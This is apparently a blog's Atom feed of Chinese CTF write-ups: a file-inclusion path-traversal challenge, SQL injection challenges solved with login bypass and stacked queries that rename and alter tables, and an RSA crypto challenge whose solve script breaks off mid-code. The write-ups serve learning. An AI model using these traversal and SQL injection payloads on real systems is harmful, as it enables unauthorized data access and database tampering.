<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>cr0fyの博客</title>
  
  <subtitle>生如夏花之灿烂，死如秋叶之静美</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-09-15T13:02:32.023Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>cr0fy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BUU刷题日记[1]web</title>
    <link href="http://example.com/2021/09/14/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0[1]web/"/>
    <id>http://example.com/2021/09/14/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0[1]web/</id>
    <published>2021-09-14T02:24:38.000Z</published>
    <updated>2021-09-15T13:02:32.023Z</updated>
    
    <content type="html"><![CDATA[<p>1.[HCTF 2018]WarmUp<br>2.[极客大挑战 2019]EasySQL<br>3.[极客大挑战 2019]Havefun</p><span id="more"></span><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>开始是个滑稽图片，访问控制台得知source.php得到源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static <span class="keyword">function</span> checkFile(&amp;<span class="variable">$page</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! isset(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! empty(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="built_in">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在source.php中得知下一步hint.php</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag not here, and flag <span class="keyword">in</span> ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>猜测flag在ffffllllaaaagggg文件夹中</p><p>对checkFile函数加以分析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static <span class="keyword">function</span> checkFile(&amp;<span class="variable">$page</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];    //设置白名单</span><br><span class="line">            <span class="keyword">if</span> (! isset(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;                   //isset函数判断变量是否赋值，后一个函数判断是否为字符串，需满足两个条件</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;                          //匹配判断变量中是否含有白名单列表</span><br><span class="line">                <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(               //返回page中第一个 <span class="string">&#x27;?&#x27;</span>的位置</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;                        //检查是否白名单列表</span><br><span class="line">                <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(                                      //返回_page中第一个<span class="string">&#x27;?&#x27;</span>的位置</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;                        //检查是否白名单列表</span><br><span class="line">                <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对source.php中flag产生的条件进行分析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (! empty(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])                             </span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])                                 </span><br><span class="line">    ) &#123;</span><br><span class="line">        include <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="built_in">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>需要满足三个条件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file参数不为空</span><br><span class="line">file参数是一个string类型</span><br><span class="line">file参数能够通过checkFile的检验</span><br></pre></td></tr></table></figure><p>有两次问号过滤和白名单检测,<br>再利用include函数的目录跳转<br><img src="/images/BUU1.png" alt="Alt text"><br>构造payload：source.php/?file=hint.php?../../../../../../ffffllllaaaagggg</p><p>可以想象第一次过滤得到source.php，通过白名单检查，第二次过滤得到hint.php，也通过白名单检查，最终跳转读取ffffllllaaaagggg文件得到flag<br><img src="/images/BUU2.png" alt="Alt text"></p><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p><img src="/images/BUU3.png" alt="Alt text"></p><p>直接使用万能密码 admin’ or ‘1’ =  ‘1</p><p><img src="/images/BUU4.png" alt="Alt text"></p><p>得到flag<br>flag{d2d41481-a732-42d3-b873-77a8a25f4ff7}</p><h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>白给题<br>查看控制台，发现提示<br><img src="/images/BUU5.png" alt="Alt text"><br>传参后得到flag<br><img src="/images/Havefun.png" alt="Alt text"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;1.[HCTF 2018]WarmUp&lt;br&gt;2.[极客大挑战 2019]EasySQL&lt;br&gt;3.[极客大挑战 2019]Havefun&lt;/p&gt;</summary>
    
    
    
    <category term="BUU刷题" scheme="http://example.com/categories/BUU%E5%88%B7%E9%A2%98/"/>
    
    
  </entry>
  
  <entry>
    <title>强网杯 2019_随便注</title>
    <link href="http://example.com/2021/09/14/[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8/"/>
    <id>http://example.com/2021/09/14/[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8/</id>
    <published>2021-09-14T02:24:38.000Z</published>
    <updated>2021-09-17T11:52:19.064Z</updated>
    
    <content type="html"><![CDATA[<p>这个题目有一点难度，单独放一个方便自己学习</p><span id="more"></span><h2 id="常规"><a href="#常规" class="headerlink" title="常规"></a>常规</h2><p>开头用万能密码试试水</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; or &#x27;</span>1<span class="string">&#x27; = &#x27;</span>1</span><br></pre></td></tr></table></figure><p>有回显<br><img src="/.com//%E9%9A%8F%E4%BE%BF%E6%B3%A81.png" alt="Alt text"></p><p>测试字段数 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; order by 1#</span></span><br></pre></td></tr></table></figure><p>到3的时候报错，说明字段数为2<br><img src="/.com//%E9%9A%8F%E4%BE%BF%E6%B3%A82.png" alt="Alt text"></p><p>下一步尝试union注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; union select 1,2#</span></span><br></pre></td></tr></table></figure><p>发现报错，并得知过滤的关键字<br><img src="/.com//%E9%9A%8F%E4%BE%BF%E6%B3%A83.png" alt="Alt text"></p><p>看了大佬博客得知用堆叠注入（通过’;’注入多条SQL语句）</p><p>先爆数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;show databases;#</span></span><br></pre></td></tr></table></figure><p><img src="/.com//%E9%9A%8F%E4%BE%BF%E6%B3%A84.png" alt="Alt text"></p><p>然后爆表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;show tables;#</span></span><br></pre></td></tr></table></figure><p><img src="/.com//%E9%9A%8F%E4%BE%BF%E6%B3%A85.png" alt="Alt text"></p><p>这里有两个表<br>先尝试words表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;show columns from words;#</span></span><br></pre></td></tr></table></figure><p><img src="/.com//%E9%9A%8F%E4%BE%BF%E6%B3%A86.png" alt="Alt text"></p><p>然后爆1919810931114514表<br>要注意当表名为数字的时候，需要用反引号包起来查询</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;show columns from `1919810931114514`;#</span></span><br></pre></td></tr></table></figure><p><img src="/.com//%E9%9A%8F%E4%BE%BF%E6%B3%A87.png" alt="Alt text"></p><p>这个时候普通方法结束了，需要整一点骚操作</p><p>在网上借鉴了大佬博客，发现有三种解题方法</p><h2 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h2><h3 id="使用rename把words表改为其他表名。"><a href="#使用rename把words表改为其他表名。" class="headerlink" title="使用rename把words表改为其他表名。"></a>使用rename把words表改为其他表名。</h3><h3 id="把1919810931114514表的名字改为words"><a href="#把1919810931114514表的名字改为words" class="headerlink" title="把1919810931114514表的名字改为words."></a>把1919810931114514表的名字改为words.</h3><h3 id="将flag名改为id"><a href="#将flag名改为id" class="headerlink" title="将flag名改为id"></a>将flag名改为id</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; ; rename table words to word1 ; rename table `1919810931114514` to words ; alter table words change flag id varchar(100);#</span></span><br></pre></td></tr></table></figure><p><img src="/.com//%E9%9A%8F%E4%BE%BF%E6%B3%A88.png" alt="Alt text"></p><h2 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h2><p>因为select被过滤，将select * from <code>1919810931114514</code>进行16进制编码<br>构造payload得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</span></span><br></pre></td></tr></table></figure><p>知识点<br>1.prepare…from…是预处理语句，会进行编码转换。<br>2.execute用来执行由SQLPrepare创建的SQL语句。<br>3.SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。</p><h2 id="解法3"><a href="#解法3" class="headerlink" title="解法3"></a>解法3</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;; handler `1919810931114514` open as `a`; handler `a` read next;#</span></span><br></pre></td></tr></table></figure><h2 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h2><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;show databases;# //数据库</span></span><br><span class="line"><span class="string">1&#x27;</span>;show tables;<span class="comment">#  //表名</span></span><br><span class="line">1<span class="string">&#x27;;show columns from table;#   //字段</span></span><br></pre></td></tr></table></figure><h3 id="修改表名和字段名"><a href="#修改表名和字段名" class="headerlink" title="修改表名和字段名"></a>修改表名和字段名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//改列名</span><br><span class="line">alter table &quot; table_name&quot; change &quot; column1&quot; &quot; column2&quot; type;</span><br><span class="line"></span><br><span class="line">alter table &quot;table_name&quot; rename &quot;column1&quot; to &quot;column2&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//把table_name表下的column改名为new_column</span><br><span class="line">alter table &#x27;table_name&#x27; change &#x27;column&#x27; &#x27;new_column&#x27; type;</span><br><span class="line"></span><br><span class="line">//添加一个列</span><br><span class="line">alter table &quot; table_name&quot; add &quot; column_name&quot;  type;</span><br><span class="line"></span><br><span class="line">//删除一个列</span><br><span class="line">alter table &quot; table_name&quot; drop &quot; column_name&quot;  type;</span><br><span class="line"></span><br><span class="line">//改变列的数据类型</span><br><span class="line">alter table &quot; table_name&quot; alter column &quot; column_name&quot; type;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;这个题目有一点难度，单独放一个方便自己学习&lt;/p&gt;</summary>
    
    
    
    <category term="BUU刷题" scheme="http://example.com/categories/BUU%E5%88%B7%E9%A2%98/"/>
    
    
  </entry>
  
  <entry>
    <title>2021云爆杯_四校联考</title>
    <link href="http://example.com/2021/09/04/2021%E4%BA%91%E7%88%86%E6%9D%AF_%E5%9B%9B%E6%A0%A1%E8%81%94%E8%80%83/"/>
    <id>http://example.com/2021/09/04/2021%E4%BA%91%E7%88%86%E6%9D%AF_%E5%9B%9B%E6%A0%A1%E8%81%94%E8%80%83/</id>
    <published>2021-09-04T02:24:38.000Z</published>
    <updated>2021-09-15T12:54:14.937Z</updated>
    
    <content type="html"><![CDATA[<p>内部赛</p><span id="more"></span><h2 id="1-EZ-Rsa"><a href="#1-EZ-Rsa" class="headerlink" title="1.EZ_Rsa"></a>1.EZ_Rsa</h2><p>先附上原题脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">text = [<span class="string">&#x27;xxxx&#x27;</span>,<span class="string">&#x27;xxxx&#x27;</span>,<span class="string">&#x27;xxxx&#x27;</span>]</span><br><span class="line">msg1 = text[0].encode()</span><br><span class="line">msg2 = text[1].encode()</span><br><span class="line">msg3 = text[2].encode()</span><br><span class="line"></span><br><span class="line">answer = msg1 + msg2 + msg3</span><br><span class="line">flag = <span class="string">&#x27;flag&#123;&#x27;</span> + hashlib.sha256(answer).hexdigest() + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">msg1 = bytes_to_long(msg1)</span><br><span class="line">msg2 = bytes_to_long(msg2)</span><br><span class="line">msg3 = bytes_to_long(msg3)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&gt;&gt;Part1&#x27;</span>)</span><br><span class="line">p1 = getPrime(512)</span><br><span class="line">q1 = getPrime(512)</span><br><span class="line">n1 = p1 * q1</span><br><span class="line">e1 = 0x101</span><br><span class="line"><span class="built_in">print</span>(p1,q1)</span><br><span class="line"><span class="built_in">print</span>(pow(msg1,e1,n1))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&gt;&gt;Part2&#x27;</span>)</span><br><span class="line">p2 = getPrime(512)</span><br><span class="line">q2 = getPrime(512)</span><br><span class="line">n2 = p2 * q2</span><br><span class="line">e2 = 0x101</span><br><span class="line">e3 = 0x10001</span><br><span class="line"><span class="built_in">print</span>(n2)</span><br><span class="line"><span class="built_in">print</span>(pow(msg2, e2, n2))</span><br><span class="line"><span class="built_in">print</span>(pow(msg2, e3, n2))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&gt;&gt;Part3&#x27;</span>)</span><br><span class="line">p3 = getPrime(512)</span><br><span class="line">q3 = getPrime(512)</span><br><span class="line">n3 = p3 * q3</span><br><span class="line"><span class="built_in">print</span>(pow(msg3, e3, n3))</span><br><span class="line"><span class="built_in">print</span>(e3, n3)</span><br><span class="line"><span class="built_in">print</span>(p3&gt;&gt;100)</span><br><span class="line"><span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;Part1</span></span><br><span class="line"><span class="string">11693420529824711957848877878555060508607341184696923385242148106736047114727159175807160519901563374905426109609833610975906619098858392814160862926458439 13328302199989222909395433501708008501389006150636924955949357304706804677448306981604438746491395750101270025755686040619794879810309676335385613329144829</span></span><br><span class="line"><span class="string">142101996556494361367379307289178830609978018209124921588154364904430024634183984713294961047243642123018624512633776884898632977444919865602488143824369406113236863132500550981251719597331808955351716961584783004411000612194142334635034612960693038822551346323987742831705749218050161464265758959578229097627</span></span><br><span class="line"><span class="string">&gt;&gt;Part2</span></span><br><span class="line"><span class="string">96644761669624481301917738904558511784349689869284077227291095697383603370416696531038428870514904299839725620796103329082259883963293954990250648331621341612726931174557257677636896537544958896292649989756895190445785876393803989356576607112504335129072639030916034557841042095819625963688752801565503231051</span></span><br><span class="line"><span class="string">33779700221348135863883889808859563343423001889653007646555069516716259945612034733082561959883961917662442280291944562628883748407830474721742306313000702967971453373637827273515616724662511317244698194870689547692454885460872111009447484052870214525773772949797440252321711833250575503307765208772617173270</span></span><br><span class="line"><span class="string">30751047399313667982517938591543296360089165396123556639822192850466091408760212776242161290545404062143092058831777133453019026398775795321668225155960973377187125716966663728065553458641296126185722656640906185814271035328849549938786034165849397581790764362592273425592482065323159559623654210395502163654</span></span><br><span class="line"><span class="string">&gt;&gt;Part3</span></span><br><span class="line"><span class="string">16934577053001307057854504993001752428438472030078462201433637839940457185838424666208134671016158665074466182774888595874063521317804445301020441500474225790694877804730598327025760391068106387441603824243560070381181899822479846878894800711049348702186023694716825082498367427714154072127920412210673327205</span></span><br><span class="line"><span class="string">65537 80109018557353827320458455535765436463225335928012438772461958597349921842498299564523960369680047354476986568989071964740696426168299922901896285681927391448831968896549777249983312382486370651978138507159676669235052240712648692954558605647795239547687705171147624122887824463803537036584843110089828677511</span></span><br><span class="line"><span class="string">8867983383521941183042966204184582810554933770125890323990596024493007165819743330176061700455869827561884657150374320733943</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>Msg1是基础RSA解密<br>Msg2是共模攻击<br>先附上前两个的解密脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">import gmpy2</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"><span class="comment">#求msg1,基础rsa解密</span></span><br><span class="line"></span><br><span class="line">p1=11693420529824711957848877878555060508607341184696923385242148106736047114727159175807160519901563374905426109609833610975906619098858392814160862926458439</span><br><span class="line">q1=13328302199989222909395433501708008501389006150636924955949357304706804677448306981604438746491395750101270025755686040619794879810309676335385613329144829</span><br><span class="line">n1=p1*q1</span><br><span class="line">e1=0x101</span><br><span class="line">c1=142101996556494361367379307289178830609978018209124921588154364904430024634183984713294961047243642123018624512633776884898632977444919865602488143824369406113236863132500550981251719597331808955351716961584783004411000612194142334635034612960693038822551346323987742831705749218050161464265758959578229097627</span><br><span class="line">phi=(p1-1)*(q1-1)</span><br><span class="line">d=gmpy2.invert(e1,phi)</span><br><span class="line">msg1=pow(c1,d,n1)</span><br><span class="line"><span class="built_in">print</span> (binascii.unhexlify(hex(msg1)[2:].strip(<span class="string">&quot;L&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#求msg2，共模攻击脚本</span></span><br><span class="line"></span><br><span class="line">sys.setrecursionlimit(1000000)</span><br><span class="line">def egcd(a, b):</span><br><span class="line">    <span class="keyword">if</span> a == 0:</span><br><span class="line">      <span class="built_in">return</span> (b, 0, 1)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      g, y, x = egcd(b % a, a)</span><br><span class="line">      <span class="built_in">return</span> (g, x - (b // a) * y, y)</span><br><span class="line">def modinv(a, m):</span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != 1:</span><br><span class="line">      raise Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">    <span 